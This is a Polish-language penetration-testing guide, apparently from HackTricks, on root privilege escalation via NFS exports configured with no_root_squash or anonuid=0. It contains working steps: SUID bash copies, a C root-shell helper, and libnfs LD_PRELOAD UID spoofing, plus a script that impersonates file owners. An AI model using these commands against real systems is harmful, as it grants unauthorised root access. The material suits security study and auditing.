# Eskalacja uprawnień przez błędną konfigurację NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje o squashowaniu

W przypadku NFS AUTH_SYS/AUTH_UNIX serwer opiera kontrolę uprawnień do plików na wartościach `uid` i `gid` przekazanych w każdym żądaniu RPC. Inne mechanizmy bezpieczeństwa, takie jak Kerberos, używają innych poświadczeń, a serwer może mapować poświadczenia numeryczne przed sprawdzeniem uprawnień.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapuje każdy UID i GID na konto anonimowe, które w systemie Linux domyślnie nazywa się `nobody` (65534). `no_all_squash` jest ustawieniem domyślnym dla żądań innych niż root.<sup>[[4]](#references)</sup>
- **`root_squash`**: To ustawienie domyślne w systemie Linux. Mapuje żądania z UID/GID 0 (root) na konto anonimowe; pozostałe UID i GID nie są squashowane.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Wyłącza squashowanie roota, więc żądania z UID/GID 0 mogą być obsługiwane na serwerze jako root.<sup>[[4]](#references)</sup>

Jeśli dozwolony klient może zamontować zapisywalny export skonfigurowany w **`/etc/exports`** z opcją **`no_root_squash`**, jego żądania z UID/GID 0 mogą zapisywać dane jako użytkownik root serwera.<sup>[[4]](#references)</sup>

`root_squash` mapuje tylko UID/GID 0; w przypadku AUTH_SYS **niezerowy numeryczny UID/GID** dozwolonego klienta nadal może odpowiadać innemu kontu na serwerze. Dlatego zapisywalny export może umożliwić dostęp jako inny użytkownik nawet przy włączonym squashowaniu roota, jeśli klient może utworzyć plik z taką tożsamością numeryczną, a serwer zezwala na dostęp. W przypadku przekazania uprawnień za pomocą SUID/SGID sprawdź również właściciela utworzonego pliku, dostęp do jego uruchamiania, stan `nosuid` w opcjach montowania po stronie serwera, ACL oraz SELinux lub inne mechanizmy zasad. Sama ścieżka exportu, opcja `rw` lub zgodność numerów nie dowodzą, że klient ma do niego dostęp, export jest aktywny ani że oba hosty stosują takie samo mapowanie tożsamości. Sprawdzaj pasywnie `/etc/exports` i lokalne metadane; podczas enumeracji nie montuj nowego udziału ani nie twórz pliku testowego.<sup>[[4]](#references)[[5]](#references)</sup>

Więcej informacji o **NFS**:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Eskalacja uprawnień

### Mapowanie anonimowego użytkownika równoważne rootowi

Nie sprawdzaj wyłącznie, czy ustawiono `no_root_squash`. Przy `root_squash,anonuid=0,anongid=0` żądanie klienta z UID/GID 0 jest squashowane **z powrotem do roota**. Przy `all_squash,anonuid=0,anongid=0` nawet tożsamości klientów innych niż root są mapowane na roota na serwerze. W przypadku zapisywalnego exportu `sec=sys` każda z tych konfiguracji może zapewnić możliwość utworzenia pliku należącego do roota, wykorzystywaną w opisanym poniżej przekazaniu uprawnień SUID; nadal obowiązują ograniczenia dotyczące dozwolonego klienta i montowania po stronie ofiary.<sup>[[4]](#references)</sup>

Na serwerze użyj `exportfs -v`, aby sprawdzić aktywny export i opcje dotyczące **pasującego klienta**, w tym `rw`, `sec=`, tryb squashowania oraz `anonuid`/`anongid`. Podczas sprawdzania konfiguracji przejrzyj też `/etc/exports.d/*.exports`; sam plik `/etc/exports` może nie zawierać wszystkich informacji.<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Zdalne wykorzystanie

Opcja 1 z użyciem bash:
- Na dozwolonym kliencie zamontuj jako root eksport z prawem zapisu, skopiuj do niego **`/bin/bash`**, ustaw jego bit **SUID** i uruchom go z montowania ofiary, które nie używa `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Aby przesłany plik zachował właściciela root, serwer musi zachować UID 0 klienta dzięki **`no_root_squash`** albo mapować żądanie na UID 0 za pomocą **`anonuid=0`**. W przeciwnym razie plik binarny SUID dla innego konta jest możliwy tylko wtedy, gdy klient może utworzyć go lub zostać jego właścicielem z numerycznym UID/GID tego konta.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Opcja 2 z użyciem skompilowanego kodu C:
- Zamontuj katalog z dozwolonego klienta, skopiuj do niego skompilowany payload wykorzystujący uprawnienia SUID, ustaw jego bit **SUID** i uruchom go na maszynie ofiary (zobacz przykładowe [payloady SUID w C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Obowiązują te same ograniczenia co poprzednio

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Lokalny exploit

> [!TIP]
> Pamiętaj, że jeśli możesz utworzyć **tunel ze swojego komputera do komputera ofiary, nadal możesz użyć wersji zdalnej do wykorzystania tego podniesienia uprawnień, tunelując wymagane porty**.\
> Poniższa sztuczka przydaje się, gdy `/etc/exports` ogranicza eksport do adresu IP ofiary: zdalny klient nie może go zamontować, ale lokalna technika może działać za pośrednictwem udziału zamontowanego już na dozwolonym hoście.<sup>[[2]](#references)</sup>\
> W przypadku tej metody z nieuprzywilejowanym libnfs eksport w **`/etc/exports`** musi używać flagi `insecure`, aby proces mógł korzystać z niezarezerwowanego portu źródłowego; `secure` jest ustawieniem domyślnym, ale proces, który może powiązać się z portem zarezerwowanym, nie potrzebuje tej opcji.<sup>[[1]](#references)[[4]](#references)</sup>

### Podstawowe informacje

Klient NFSv3 AUTH_UNIX dołącza swój efektywny UID, GID i grupy do każdego wywołania, a serwer wykorzystuje je podczas sprawdzania uprawnień. Ta lokalna technika wykorzystuje ten model, fałszując dane uwierzytelniające RPC przez [libnfs](https://github.com/sahlberg/libnfs); jego moduł preload obsługuje nadpisywanie UID/GID w kontekście NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompilowanie biblioteki

Przykład libnfs może wymagać dostosowania do jądra docelowego; w opisanym tutaj przewodniku zaznaczono, że przed skompilowaniem modułu preload należy zakomentować wywołania systemowe fallocate.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Przeprowadzanie exploit

Przykład tworzy mały helper w C, który uruchamia shell, następnie umieszcza go na udziale i używa `ld_nfs.so` z UID 0 w kontekście NFS, aby nadać mu SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Skompiluj kod exploita:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Umieść exploit na udziale i zmień jego uprawnienia, podszywając się pod UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Uruchom exploit, aby uzyskać uprawnienia root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell do dyskretnego dostępu do plików

Po uzyskaniu dostępu root ten wzorzec `nfsh.py` ustawia efektywny UID na UID docelowego pliku przed uruchomieniem polecenia, umożliwiając dostęp bez rekursywnej zmiany właściciela.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Uruchom w następujący sposób:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Historia mniej znanego sposobu eskalacji uprawnień przez NFS](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: Specyfikacja protokołu NFS w wersji 3](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — strona podręcznika Linuxa](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
